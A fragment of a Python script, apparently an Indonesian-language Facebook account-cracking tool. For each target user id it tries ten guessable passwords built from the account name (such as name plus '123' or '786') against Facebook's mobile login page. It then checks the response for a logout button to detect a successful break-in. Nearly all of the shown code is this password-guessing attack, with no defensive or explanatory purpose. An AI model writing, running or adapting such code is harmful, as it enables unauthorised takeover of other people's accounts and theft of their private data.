...
def celek():
	...
	print("\n "+N+"[!] Ketik ctrl+z untuk berhenti crack.")
	print(" "+N+"[!] Crack menggunakan 10 list sandi.")
	print(" "+N+"-----------------------------------------------")
	...
	def main(user):
		...
		try:
			...
			for pw in [name.lower()+'123',name.lower()+'1234',name.lower()+'12345',name.lower(),name.lower()+'786','786786','102030','111222','445566','000786']:
				rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pw, 'login': 'submit'}, headers={'user-agent': ua})
				xo = rex.content
				if 'mbasic_logout_button' in xo or 'save-device' in xo:
